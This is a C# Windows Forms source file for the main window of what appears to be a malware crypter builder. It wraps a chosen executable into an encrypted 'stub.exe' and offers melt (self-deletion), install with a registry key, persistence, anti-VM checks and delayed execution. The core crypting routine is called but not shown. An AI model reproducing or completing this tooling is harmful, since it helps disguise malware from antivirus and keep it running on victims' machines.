using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace Builder
{
   public partial class MainForm : CustomForm
   {
      public MainForm()
      {
         InitializeComponent();
         keyTextBox.Enabled = false;
         fileTextBox.Enabled = false;
         meltCheckBox.Enabled = false;
      }

      private void closeButton_Click(object sender, EventArgs e)
      {
         Application.Exit();
      }

      private void exeBtn_Click(object sender, EventArgs e)
      {
         openExeDialog.ShowDialog();
         exeTextBox.Text = openExeDialog.FileName;
      }

      private void installCheckBox_CheckedChanged(object sender, EventArgs e)
      {
         bool enabled = installCheckBox.Checked;
         keyTextBox.Enabled = enabled;
         fileTextBox.Enabled = enabled;
         meltCheckBox.Enabled = enabled;
      }

      private void cryptBtn_Click(object sender, EventArgs e)
      {
         if (File.Exists(exeTextBox.Text))
         {
         
 
            int delay;
            if (!int.TryParse(delayTextBox.Text, out delay) || delay < 0)
            {
               MessageBox.Show("Delay is invalid!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
               return;
            }
            bool melt = meltCheckBox.Enabled && meltCheckBox.Checked;
            string fileName = installCheckBox.Checked ? fileTextBox.Text : "";
            string keyName = installCheckBox.Checked ? keyTextBox.Text : "";
            bool result = Builder.Write2stub(exeTextBox.Text,
               "stub.exe",
               melt,
               installCheckBox.Checked,
               persistCheckbox.Checked,
               fileName,
               keyName,
               antiVmCheckBox.Checked,
               netCheckBox.Checked,
               delay);
            if (result)
            {
               MessageBox.Show("Success your crypted file is stub.exe!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
               Application.Exit();
               return;
            }
            else
            {
               MessageBox.Show("Error writing to the stub!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
               Application.Exit();
               return;
            }

         }
         else
         {
            MessageBox.Show("EXE does not exist!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
         }
      }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }

        private void netCheckBox_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void customCheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}